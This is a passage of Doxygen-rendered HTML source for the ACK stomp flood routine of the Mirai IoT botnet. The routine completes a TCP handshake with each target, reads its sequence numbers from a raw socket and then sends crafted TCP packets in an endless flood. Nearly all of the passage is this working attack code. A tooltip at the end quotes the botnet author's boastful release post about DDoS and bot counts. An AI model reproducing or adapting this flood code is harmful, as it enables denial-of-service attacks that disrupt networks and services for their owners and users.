F_GETFL, 0) | O_NONBLOCK);</div><div class="line"><a name="l00351"></a><span class="lineno">  351</span>&#160; </div><div class="line"><a name="l00352"></a><span class="lineno">  352</span>&#160;        <span class="comment">// Set up address to connect to</span></div><div class="line"><a name="l00353"></a><span class="lineno">  353</span>&#160;        addr.sin_family = AF_INET;</div><div class="line"><a name="l00354"></a><span class="lineno">  354</span>&#160;        <span class="keywordflow">if</span> (targs[i].netmask &lt; 32)</div><div class="line"><a name="l00355"></a><span class="lineno">  355</span>&#160;            addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)<a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>()) &gt;&gt; targs[i].netmask));</div><div class="line"><a name="l00356"></a><span class="lineno">  356</span>&#160;        <span class="keywordflow">else</span></div><div class="line"><a name="l00357"></a><span class="lineno">  357</span>&#160;            addr.sin_addr.s_addr = targs[i].addr;</div><div class="line"><a name="l00358"></a><span class="lineno">  358</span>&#160;        <span class="keywordflow">if</span> (dport == 0xffff)</div><div class="line"><a name="l00359"></a><span class="lineno">  359</span>&#160;            addr.sin_port = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>() &amp; 0xffff;</div><div class="line"><a name="l00360"></a><span class="lineno">  360</span>&#160;        <span class="keywordflow">else</span></div><div class="line"><a name="l00361"></a><span class="lineno">  361</span>&#160;            addr.sin_port = htons(dport);</div><div class="line"><a name="l00362"></a><span class="lineno">  362</span>&#160;</div><div class="line"><a name="l00363"></a><span class="lineno">  363</span>&#160;        <span class="comment">// Actually connect, nonblocking</span></div><div class="line"><a name="l00364"></a><span class="lineno">  364</span>&#160;        <a class="code" href="ForumPost_8txt.html#a3eaa76d3cfe977972a9bf87dbc12c50f">connect</a>(fd, (<span class="keyword">struct</span> sockaddr *)&amp;addr, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> sockaddr_in));</div><div class="line"><a name="l00365"></a><span class="lineno">  365</span>&#160;        start_recv = time(NULL);</div><div class="line"><a name="l00366"></a><span class="lineno">  366</span>&#160;</div><div class="line"><a name="l00367"></a><span class="lineno">  367</span>&#160;        <span class="comment">// Get info</span></div><div class="line"><a name="l00368"></a><span class="lineno">  368</span>&#160;        <span class="keywordflow">while</span> (<a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>)</div><div class="line"><a name="l00369"></a><span class="lineno">  369</span>&#160;        {</div><div class="line"><a name="l00370"></a><span class="lineno">  370</span>&#160;            <span class="keywordtype">int</span> ret;</div><div class="line"><a name="l00371"></a><span class="lineno">  371</span>&#160;</div><div class="line"><a name="l00372"></a><span class="lineno">  372</span>&#160;            recv_addr_len = <span class="keyword">sizeof</span> (<span class="keyword">struct </span>sockaddr_in);</div><div class="line"><a name="l00373"></a><span class="lineno">  373</span>&#160;            ret = recvfrom(rfd, pktbuf, <span class="keyword">sizeof</span> (pktbuf), MSG_NOSIGNAL, (<span class="keyword">struct</span> sockaddr *)&amp;recv_addr, &amp;recv_addr_len);</div><div class="line"><a name="l00374"></a><span class="lineno">  374</span>&#160;            <span class="keywordflow">if</span> (ret == -1)</div><div class="line"><a name="l00375"></a><span class="lineno">  375</span>&#160;            {</div><div class="line"><a name="l00376"></a><span class="lineno">  376</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00377"></a><span class="lineno">  377</span>&#160;                printf(<span class="stringliteral">&quot;Could not listen on raw socket!\n&quot;</span>);</div><div class="line"><a name="l00378"></a><span class="lineno">  378</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00379"></a><span class="lineno">  379</span>&#160;                <span class="keywordflow">return</span>;</div><div class="line"><a name="l00380"></a><span class="lineno">  380</span>&#160;            }</div><div class="line"><a name="l00381"></a><span class="lineno">  381</span>&#160;            <span class="keywordflow">if</span> (recv_addr.sin_addr.s_addr == addr.sin_addr.s_addr &amp;&amp; ret &gt; (sizeof (<span class="keyword">struct</span> iphdr) + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> tcphdr)))</div><div class="line"><a name="l00382"></a><span class="lineno">  382</span>&#160;            {</div><div class="line"><a name="l00383"></a><span class="lineno">  383</span>&#160;                <span class="keyword">struct </span>tcphdr *tcph = (<span class="keyword">struct </span>tcphdr *)(pktbuf + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> iphdr));</div><div class="line"><a name="l00384"></a><span class="lineno">  384</span>&#160;</div><div class="line"><a name="l00385"></a><span class="lineno">  385</span>&#160;                <span class="keywordflow">if</span> (tcph-&gt;source == addr.sin_port)</div><div class="line"><a name="l00386"></a><span class="lineno">  386</span>&#160;                {</div><div class="line"><a name="l00387"></a><span class="lineno">  387</span>&#160;                    <span class="keywordflow">if</span> (tcph-&gt;syn &amp;&amp; tcph-&gt;ack)</div><div class="line"><a name="l00388"></a><span class="lineno">  388</span>&#160;                    {</div><div class="line"><a name="l00389"></a><span class="lineno">  389</span>&#160;                        <span class="keyword">struct </span>iphdr *iph;</div><div class="line"><a name="l00390"></a><span class="lineno">  390</span>&#160;                        <span class="keyword">struct </span>tcphdr *tcph;</div><div class="line"><a name="l00391"></a><span class="lineno">  391</span>&#160;                        <span class="keywordtype">char</span> *payload;</div><div class="line"><a name="l00392"></a><span class="lineno">  392</span>&#160;</div><div class="line"><a name="l00393"></a><span class="lineno">  393</span>&#160;                        stomp_data[i].<a class="code" href="structattack__stomp__data.html#a8ca853bad73b883ccf12918fa8a6e462">addr</a> = addr.sin_addr.s_addr;</div><div class="line"><a name="l00394"></a><span class="lineno">  394</span>&#160;                        stomp_data[i].<a class="code" href="structattack__stomp__data.html#ae85fad7e9f54f0d34c2bc226197497ef">seq</a> = ntohl(tcph-&gt;seq);</div><div class="line"><a name="l00395"></a><span class="lineno">  395</span>&#160;                        stomp_data[i].<a class="code" href="structattack__stomp__data.html#a22c599d05ab7da049cd9b5a4757e3220">ack_seq</a> = ntohl(tcph-&gt;ack_seq);</div><div class="line"><a name="l00396"></a><span class="lineno">  396</span>&#160;                        stomp_data[i].<a class="code" href="structattack__stomp__data.html#a3dec28f563364d02b0c29ae84c58a308">sport</a> = tcph-&gt;dest;</div><div class="line"><a name="l00397"></a><span class="lineno">  397</span>&#160;                        stomp_data[i].<a class="code" href="structattack__stomp__data.html#a72bb4223d67736e2972679840a79c72e">dport</a> = addr.sin_port;</div><div class="line"><a name="l00398"></a><span class="lineno">  398</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00399"></a><span class="lineno">  399</span>&#160;                        printf(<span class="stringliteral">&quot;ACK Stomp got SYN+ACK!\n&quot;</span>);</div><div class="line"><a name="l00400"></a><span class="lineno">  400</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00401"></a><span class="lineno">  401</span>&#160;                        <span class="comment">// Set up the packet</span></div><div class="line"><a name="l00402"></a><span class="lineno">  402</span>&#160;                        pkts[i] = malloc(<span class="keyword">sizeof</span> (<span class="keyword">struct</span> iphdr) + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> tcphdr) + data_len);</div><div class="line"><a name="l00403"></a><span class="lineno">  403</span>&#160;                        iph = (<span class="keyword">struct </span>iphdr *)pkts[i];</div><div class="line"><a name="l00404"></a><span class="lineno">  404</span>&#160;                        tcph = (<span class="keyword">struct </span>tcphdr *)(iph + 1);</div><div class="line"><a name="l00405"></a><span class="lineno">  405</span>&#160;                        payload = (<span class="keywordtype">char</span> *)(tcph + 1);</div><div class="line"><a name="l00406"></a><span class="lineno">  406</span>&#160;</div><div class="line"><a name="l00407"></a><span class="lineno">  407</span>&#160;                        iph-&gt;version = 4;</div><div class="line"><a name="l00408"></a><span class="lineno">  408</span>&#160;                        iph-&gt;ihl = 5;</div><div class="line"><a name="l00409"></a><span class="lineno">  409</span>&#160;                        iph-&gt;tos = ip_tos;</div><div class="line"><a name="l00410"></a><span class="lineno">  410</span>&#160;                        iph-&gt;tot_len = htons(<span class="keyword">sizeof</span> (<span class="keyword">struct</span> iphdr) + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> tcphdr) + data_len);</div><div class="line"><a name="l00411"></a><span class="lineno">  411</span>&#160;                        iph-&gt;id = htons(ip_ident);</div><div class="line"><a name="l00412"></a><span class="lineno">  412</span>&#160;                        iph-&gt;ttl = ip_ttl;</div><div class="line"><a name="l00413"></a><span class="lineno">  413</span>&#160;                        <span class="keywordflow">if</span> (dont_frag)</div><div class="line"><a name="l00414"></a><span class="lineno">  414</span>&#160;                            iph-&gt;frag_off = htons(1 &lt;&lt; 14);</div><div class="line"><a name="l00415"></a><span class="lineno">  415</span>&#160;                        iph-&gt;protocol = IPPROTO_TCP;</div><div class="line"><a name="l00416"></a><span class="lineno">  416</span>&#160;                        iph-&gt;saddr = <a class="code" href="mirai_2bot_2includes_8h.html#aecb64c7238a325af454cf5e17d933ff2">LOCAL_ADDR</a>;</div><div class="line"><a name="l00417"></a><span class="lineno">  417</span>&#160;                        iph-&gt;daddr = stomp_data[i].<a class="code" href="structattack__stomp__data.html#a8ca853bad73b883ccf12918fa8a6e462">addr</a>;</div><div class="line"><a name="l00418"></a><span class="lineno">  418</span>&#160;</div><div class="line"><a name="l00419"></a><span class="lineno">  419</span>&#160;                        tcph-&gt;source = stomp_data[i].<a class="code" href="structattack__stomp__data.html#a3dec28f563364d02b0c29ae84c58a308">sport</a>;</div><div class="line"><a name="l00420"></a><span class="lineno">  420</span>&#160;                        tcph-&gt;dest = stomp_data[i].<a class="code" href="structattack__stomp__data.html#a72bb4223d67736e2972679840a79c72e">dport</a>;</div><div class="line"><a name="l00421"></a><span class="lineno">  421</span>&#160;                        tcph-&gt;seq = stomp_data[i].<a class="code" href="structattack__stomp__data.html#a22c599d05ab7da049cd9b5a4757e3220">ack_seq</a>;</div><div class="line"><a name="l00422"></a><span class="lineno">  422</span>&#160;                        tcph-&gt;ack_seq = stomp_data[i].<a class="code" href="structattack__stomp__data.html#ae85fad7e9f54f0d34c2bc226197497ef">seq</a>;</div><div class="line"><a name="l00423"></a><span class="lineno">  423</span>&#160;                        tcph-&gt;doff = 8;</div><div class="line"><a name="l00424"></a><span class="lineno">  424</span>&#160;                        tcph-&gt;fin = <a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>;</div><div class="line"><a name="l00425"></a><span class="lineno">  425</span>&#160;                        tcph-&gt;ack = <a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>;</div><div class="line"><a name="l00426"></a><span class="lineno">  426</span>&#160;                        tcph-&gt;window = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>() &amp; 0xffff;</div><div class="line"><a name="l00427"></a><span class="lineno">  427</span>&#160;                        tcph-&gt;urg = urg_fl;</div><div class="line"><a name="l00428"></a><span class="lineno">  428</span>&#160;                        tcph-&gt;ack = ack_fl;</div><div class="line"><a name="l00429"></a><span class="lineno">  429</span>&#160;                        tcph-&gt;psh = psh_fl;</div><div class="line"><a name="l00430"></a><span class="lineno">  430</span>&#160;                        tcph-&gt;rst = rst_fl;</div><div class="line"><a name="l00431"></a><span class="lineno">  431</span>&#160;                        tcph-&gt;syn = syn_fl;</div><div class="line"><a name="l00432"></a><span class="lineno">  432</span>&#160;                        tcph-&gt;fin = fin_fl;</div><div class="line"><a name="l00433"></a><span class="lineno">  433</span>&#160;</div><div class="line"><a name="l00434"></a><span class="lineno">  434</span>&#160;                        <a class="code" href="rand_8c.html#a11c986f4ca9d396a9bc68c0dd4b3903f">rand_str</a>(payload, data_len);</div><div class="line"><a name="l00435"></a><span class="lineno">  435</span>&#160;                        <span class="keywordflow">break</span>;</div><div class="line"><a name="l00436"></a><span class="lineno">  436</span>&#160;                    }</div><div class="line"><a name="l00437"></a><span class="lineno">  437</span>&#160;                    <span class="keywordflow">else</span> <span class="keywordflow">if</span> (tcph-&gt;fin || tcph-&gt;rst)</div><div class="line"><a name="l00438"></a><span class="lineno">  438</span>&#160;                    {</div><div class="line"><a name="l00439"></a><span class="lineno">  439</span>&#160;                        <a class="code" href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a>(fd);</div><div class="line"><a name="l00440"></a><span class="lineno">  440</span>&#160;                        <span class="keywordflow">goto</span> stomp_setup_nums;</div><div class="line"><a name="l00441"></a><span class="lineno">  441</span>&#160;                    }</div><div class="line"><a name="l00442"></a><span class="lineno">  442</span>&#160;                }</div><div class="line"><a name="l00443"></a><span class="lineno">  443</span>&#160;            }</div><div class="line"><a name="l00444"></a><span class="lineno">  444</span>&#160;</div><div class="line"><a name="l00445"></a><span class="lineno">  445</span>&#160;            <span class="keywordflow">if</span> (time(NULL) - start_recv &gt; 10)</div><div class="line"><a name="l00446"></a><span class="lineno">  446</span>&#160;            {</div><div class="line"><a name="l00447"></a><span class="lineno">  447</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00448"></a><span class="lineno">  448</span>&#160;                printf(<span class="stringliteral">&quot;Couldn&#39;t connect to host for ACK Stomp in time. Retrying\n&quot;</span>);</div><div class="line"><a name="l00449"></a><span class="lineno">  449</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00450"></a><span class="lineno">  450</span>&#160;                <a class="code" href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a>(fd);</div><div class="line"><a name="l00451"></a><span class="lineno">  451</span>&#160;                <span class="keywordflow">goto</span> stomp_setup_nums;</div><div class="line"><a name="l00452"></a><span class="lineno">  452</span>&#160;            }</div><div class="line"><a name="l00453"></a><span class="lineno">  453</span>&#160;        }</div><div class="line"><a name="l00454"></a><span class="lineno">  454</span>&#160;    }</div><div class="line"><a name="l00455"></a><span class="lineno">  455</span>&#160;</div><div class="line"><a name="l00456"></a><span class="lineno">  456</span>&#160;    <span class="comment">// Start spewing out traffic</span></div><div class="line"><a name="l00457"></a><span class="lineno">  457</span>&#160;    <span class="keywordflow">while</span> (<a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>)</div><div class="line"><a name="l00458"></a><span class="lineno">  458</span>&#160;    {</div><div class="line"><a name="l00459"></a><span class="lineno">  459</span>&#160;        <span class="keywordflow">for</span> (i = 0; i &lt; targs_len; i++)</div><div class="line"><a name="l00460"></a><span class="lineno">  460</span>&#160;        {</div><div class="line"><a name="l00461"></a><span class="lineno">  461</span>&#160;            <span class="keywordtype">char</span> *pkt = pkts[i];</div><div class="line"><a name="l00462"></a><span class="lineno">  462</span>&#160;            <span class="keyword">struct </span>iphdr *iph = (<span class="keyword">struct </span>iphdr *)pkt;</div><div class="line"><a name="l00463"></a><span class="lineno">  463</span>&#160;            <span class="keyword">struct </span>tcphdr *tcph = (<span class="keyword">struct </span>tcphdr *)(iph + 1);</div><div class="line"><a name="l00464"></a><span class="lineno">  464</span>&#160;            <span class="keywordtype">char</span> *data = (<span class="keywordtype">char</span> *)(tcph + 1);</div><div class="line"><a name="l00465"></a><span class="lineno">  465</span>&#160;</div><div class="line"><a name="l00466"></a><span class="lineno">  466</span>&#160;            <span class="keywordflow">if</span> (ip_ident == 0xffff)</div><div class="line"><a name="l00467"></a><span class="lineno">  467</span>&#160;                iph-&gt;id = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>() &amp; 0xffff;</div><div class="line"><a name="l00468"></a><span class="lineno">  468</span>&#160;</div><div class="line"><a name="l00469"></a><span class="lineno">  469</span>&#160;            <span class="keywordflow">if</span> (data_rand)</div><div class="line"><a name="l00470"></a><span class="lineno">  470</span>&#160;                <a class="code" href="rand_8c.html#a11c986f4ca9d396a9bc68c0dd4b3903f">rand_str</a>(data, data_len);</div><div class="line"><a name="l00471"></a><span class="lineno">  471</span>&#160;</div><div class="line"><a name="l00472"></a><span class="lineno">  472</span>&#160;            iph-&gt;check = 0;</div><div class="line"><a name="l00473"></a><span class="lineno">  473</span>&#160;            iph-&gt;check = <a class="code" href="checksum_8c.html#a84522f5e663ea711a5ceafdf03e586ea">checksum_generic</a>((uint16_t *)iph, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> iphdr));</div><div class="line"><a name="l00474"></a><span class="lineno">  474</span>&#160;</div><div class="line"><a name="l00475"></a><span class="lineno">  475</span>&#160;            tcph-&gt;seq = htons(stomp_data[i].seq++);</div><div class="line"><a name="l00476"></a><span class="lineno">  476</span>&#160;            tcph-&gt;ack_seq = htons(stomp_data[i].ack_seq);</div><div class="line"><a name="l00477"></a><span class="lineno">  477</span>&#160;            tcph-&gt;check = 0;</div><div class="line"><a name="l00478"></a><span class="lineno">  478</span>&#160;            tcph-&gt;check = <a class="code" href="checksum_8c.html#a5144ab59500e01ed196ae6d8b4584c98">checksum_tcpudp</a>(iph, tcph, htons(<span class="keyword">sizeof</span> (<span class="keyword">struct</span> tcphdr) + data_len), <span class="keyword">sizeof</span> (<span class="keyword">struct</span> tcphdr) + data_len);</div><div class="line"><a name="l00479"></a><span class="lineno">  479</span>&#160;</div><div class="line"><a name="l00480"></a><span class="lineno">  480</span>&#160;            targs[i].sock_addr.sin_port = tcph-&gt;dest;</div><div class="line"><a name="l00481"></a><span class="lineno">  481</span>&#160;            sendto(rfd, pkt, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> iphdr) + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> tcphdr) + data_len, MSG_NOSIGNAL, (<span class="keyword">struct</span> sockaddr *)&amp;targs[i].sock_addr, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> sockaddr_in));</div><div class="line"><a name="l00482"></a><span class="lineno">  482</span>&#160;        }</div><div class="line"><a name="l00483"></a><span class="lineno">  483</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00484"></a><span class="lineno">  484</span>&#160;            <span class="keywordflow">break</span>;</div><div class="line"><a name="l00485"></a><span class="lineno">  485</span>&#160;            <span class="keywordflow">if</span> (errno != 0)</div><div class="line"><a name="l00486"></a><span class="lineno">  486</span>&#160;                printf(<span class="stringliteral">&quot;errno = %d\n&quot;</span>, errno);</div><div class="line"><a name="l00487"></a><span class="lineno">  487</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00488"></a><span class="lineno">  488</span>&#160;    }</div><div class="line"><a name="l00489"></a><span class="lineno">  489</span>&#160;}</div><div class="ttc" id="structattack__stomp__data_html_ae85fad7e9f54f0d34c2bc226197497ef"><div class="ttname"><a href="structattack__stomp__data.html#ae85fad7e9f54f0d34c2bc226197497ef">attack_stomp_data::seq</a></div><div class="ttdeci">uint32_t seq</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00080">attack.h:80</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_adccb5337cf206fe3eca7c4732f634bb9"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#adccb5337cf206fe3eca7c4732f634bb9">port_t</a></div><div class="ttdeci">uint16_t port_t</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00014">includes.h:14</a></div></div>
<div class="ttc" id="checksum_8c_html_a84522f5e663ea711a5ceafdf03e586ea"><div class="ttname"><a href="checksum_8c.html#a84522f5e663ea711a5ceafdf03e586ea">checksum_generic</a></div><div class="ttdeci">uint16_t checksum_generic(uint16_t *addr, uint32_t count)</div><div class="ttdef"><b>Definition:</b> <a href="checksum_8c_source.html#l00009">checksum.c:9</a></div></div>
<div class="ttc" id="attack_8h_html_a4f086d53d4494633a898fbd9886b08bf"><div class="ttname"><a href="attack_8h.html#a4f086d53d4494633a898fbd9886b08bf">ATK_OPT_SYN</a></div><div class="ttdeci">#define ATK_OPT_SYN</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00061">attack.h:61</a></div></div>
<div class="ttc" id="wget_8c_html_aa8318fbee111c5bde5952c63e894c962"><div class="ttname"><a href="wget_8c.html#aa8318fbee111c5bde5952c63e894c962">socket</a></div><div class="ttdeci">#define socket</div><div class="ttdef"><b>Definition:</b> <a href="wget_8c_source.html#l00047">wget.c:47</a></div></div>
<div class="ttc" id="wget_8c_html_a9c7f6d5331abb2692a876d5ee67474b7"><div class="ttname"><a href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a></div><div class="ttdeci">#define close</div><div class="ttdef"><b>Definition:</b> <a href="wget_8c_source.html#l00052">wget.c:52</a></div></div>
<div class="ttc" id="attack_8h_html_acfa2ed8a557040aed04b6c9346aa0eb9"><div class="ttname"><a href="attack_8h.html#acfa2ed8a557040aed04b6c9346aa0eb9">ATK_OPT_IP_TTL</a></div><div class="ttdeci">#define ATK_OPT_IP_TTL</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00050">attack.h:50</a></div></div>
<div class="ttc" id="mirai_2bot_2includes_8h_html_aecb64c7238a325af454cf5e17d933ff2"><div class="ttname"><a href="mirai_2bot_2includes_8h.html#aecb64c7238a325af454cf5e17d933ff2">LOCAL_ADDR</a></div><div class="ttdeci">ipv4_t LOCAL_ADDR</div><div class="ttdef"><b>Definition:</b> <a href="mirai_2bot_2includes_8h_source.html#l00031">includes.h:31</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_aa8cecfc5c5c054d2875c03e77b7be15d"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a></div><div class="ttdeci">#define TRUE</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00010">includes.h:10</a></div></div>
<div class="ttc" id="structattack__stomp__data_html_a8ca853bad73b883ccf12918fa8a6e462"><div class="ttname"><a href="structattack__stomp__data.html#a8ca853bad73b883ccf12918fa8a6e462">attack_stomp_data::addr</a></div><div class="ttdeci">ipv4_t addr</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00079">attack.h:79</a></div></div>
<div class="ttc" id="attack_8h_html_a4464ea34ef73875f57b5c6a412aaac20"><div class="ttname"><a href="attack_8h.html#a4464ea34ef73875f57b5c6a412aaac20">ATK_OPT_RST</a></div><div class="ttdeci">#define ATK_OPT_RST</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00060">attack.h:60</a></div></div>
<div class="ttc" id="rand_8c_html_a11c986f4ca9d396a9bc68c0dd4b3903f"><div class="ttname"><a href="rand_8c.html#a11c986f4ca9d396a9bc68c0dd4b3903f">rand_str</a></div><div class="ttdeci">void rand_str(char *str, int len)</div><div class="ttdef"><b>Definition:</b> <a href="rand_8c_source.html#l00032">rand.c:32</a></div></div>
<div class="ttc" id="structattack__stomp__data_html_a72bb4223d67736e2972679840a79c72e"><div class="ttname"><a href="structattack__stomp__data.html#a72bb4223d67736e2972679840a79c72e">attack_stomp_data::dport</a></div><div class="ttdeci">port_t dport</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00081">attack.h:81</a></div></div>
<div class="ttc" id="checksum_8c_html_a5144ab59500e01ed196ae6d8b4584c98"><div class="ttname"><a href="checksum_8c.html#a5144ab59500e01ed196ae6d8b4584c98">checksum_tcpudp</a></div><div class="ttdeci">uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len)</div><div class="ttdef"><b>Definition:</b> <a href="checksum_8c_source.html#l00024">checksum.c:24</a></div></div>
<div class="ttc" id="structattack__stomp__data_html"><div class="ttname"><a href="structattack__stomp__data.html">attack_stomp_data</a></div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00078">attack.h:78</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_af492d2bddcb2befacb3aa03dcdf9aafd"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a></div><div class="ttdeci">char BOOL</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00011">includes.h:11</a></div></div>
<div class="ttc" id="structattack__stomp__data_html_a22c599d05ab7da049cd9b5a4757e3220"><div class="ttname"><a href="structattack__stomp__data.html#a22c599d05ab7da049cd9b5a4757e3220">attack_stomp_data::ack_seq</a></div><div class="ttdeci">uint32_t ack_seq</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00080">attack.h:80</a></div></div>
<div class="ttc" id="rand_8c_html_accf5c4faf4fb7eb9d74bbf1764921b00"><div class="ttname"><a href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a></div><div class="ttdeci">uint32_t rand_next(void)</div><div class="ttdef"><b>Definition:</b> <a href="rand_8c_source.html#l00021">rand.c:21</a></div></div>
<div class="ttc" id="attack_8h_html_a5a6f282c43f088516dce2de1b69ae7d8"><div class="ttname"><a href="attack_8h.html#a5a6f282c43f088516dce2de1b69ae7d8">ATK_OPT_URG</a></div><div class="ttdeci">#define ATK_OPT_URG</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00057">attack.h:57</a></div></div>
<div class="ttc" id="attack_8h_html_ac8d9ef7cc50e5b0e43f50b087c4c7104"><div class="ttname"><a href="attack_8h.html#ac8d9ef7cc50e5b0e43f50b087c4c7104">ATK_OPT_PAYLOAD_RAND</a></div><div class="ttdeci">#define ATK_OPT_PAYLOAD_RAND</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00047">attack.h:47</a></div></div>
<div class="ttc" id="attack_8h_html_a2ad2949e3a473ebba047e474abf5d461"><div class="ttname"><a href="attack_8h.html#a2ad2949e3a473ebba047e474abf5d461">ATK_OPT_FIN</a></div><div class="ttdeci">#define ATK_OPT_FIN</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00062">attack.h:62</a></div></div>
<div class="ttc" id="attack_8h_html_a57162ecbd3f7644a8f6a6b58aa4f8596"><div class="ttname"><a href="attack_8h.html#a57162ecbd3f7644a8f6a6b58aa4f8596">ATK_OPT_IP_DF</a></div><div class="ttdeci">#define ATK_OPT_IP_DF</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00051">attack.h:51</a></div></div>
<div class="ttc" id="attack_8h_html_a1ac4210e00c74506c31642a74e3fc1c7"><div class="ttname"><a href="attack_8h.html#a1ac4210e00c74506c31642a74e3fc1c7">ATK_OPT_IP_TOS</a></div><div class="ttdeci">#define ATK_OPT_IP_TOS</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00048">attack.h:48</a></div></div>
<div class="ttc" id="attack_8h_html_aacac129514ea3914af56b5eb4c71f8c6"><div class="ttname"><a href="attack_8h.html#aacac129514ea3914af56b5eb4c71f8c6">ATK_OPT_PAYLOAD_SIZE</a></div><div class="ttdeci">#define ATK_OPT_PAYLOAD_SIZE</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00046">attack.h:46</a></div></div>
<div class="ttc" id="structattack__stomp__data_html_a3dec28f563364d02b0c29ae84c58a308"><div class="ttname"><a href="structattack__stomp__data.html#a3dec28f563364d02b0c29ae84c58a308">attack_stomp_data::sport</a></div><div class="ttdeci">port_t sport</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00081">attack.h:81</a></div></div>
<div class="ttc" id="attack_8c_html_ab59e5bf31f63eeb001f8ec1278a15907"><div class="ttname"><a href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a></div><div class="ttdeci">int attack_get_opt_int(uint8_t opts_len, struct attack_option *opts, uint8_t opt, int def)</div><div class="ttdef"><b>Definition:</b> <a href="attack_8c_source.html#l00206">attack.c:206</a></div></div>
<div class="ttc" id="attack_8h_html_a61c202b303f42c57328c999b1104877d"><div class="ttname"><a href="attack_8h.html#a61c202b303f42c57328c999b1104877d">ATK_OPT_ACK</a></div><div class="ttdeci">#define ATK_OPT_ACK</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00058">attack.h:58</a></div></div>
<div class="ttc" id="attack_8h_html_a5ae76926414352bb8e12896c5581a0fd"><div class="ttname"><a href="attack_8h.html#a5ae76926414352bb8e12896c5581a0fd">ATK_OPT_PSH</a></div><div class="ttdeci">#define ATK_OPT_PSH</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00059">attack.h:59</a></div></div>
<div class="ttc" id="ForumPost_8txt_html_a3eaa76d3cfe977972a9bf87dbc12c50f"><div class="ttname"><a href="ForumPost_8txt.html#a3eaa76d3cfe977972a9bf87dbc12c50f">connect</a></div><div class="ttdeci">World s Largest Echo CNC source code release Anna When I first go in DDoS I wasn t planning on staying in it long I made my there s lots of eyes looking at IOT so it s time to GTFO I know every skid and their it s their wet dream to have something besides qbot So I have an amazing release for you With I usually pull max bots from telnet alone after the Kreb ISPs been slowly shutting down and cleaning up their act max pull is about and dropping I am your and I will treat you real my hf chan And to everyone that thought they were doing anything by hitting my I had good this bot uses domain for CNC It takes seconds for all bots to lol shoutout to this blog post by malwaremustdie thought you were good but you really just completely and totally failed in reversing this binary We still have better kung fu than you kiddos don t make me laugh you made so many mistakes and even confused some different binaries with my LOL Let me give you some slaps back port is not for back connect</div><div class="ttdef"><b>Definition:</b> <a href="ForumPost_8txt_source.html#l00001">ForumPost.txt:1</a></div></div>
